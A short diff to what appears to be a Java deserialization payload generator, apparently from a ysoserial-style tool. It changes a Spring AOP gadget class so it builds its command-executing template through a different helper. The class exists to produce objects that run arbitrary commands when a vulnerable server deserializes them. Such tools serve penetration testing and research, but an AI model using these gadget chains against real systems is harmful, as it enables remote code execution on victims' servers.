@@ -29,7 +29,7 @@ public class SpringAOPWithTemplates extends PayloadRunner implements CommandObje
     @Override
     public Object getObject(String cmd) throws Exception
     {
-        Object template = Gadgets.createTemplatesImpl(cmd);
+        Object template = Gadgets.createTemplates4Cmd(cmd);
 
         AdvisedSupport advisedSupport = new AdvisedSupport();
         advisedSupport.setTarget("test");
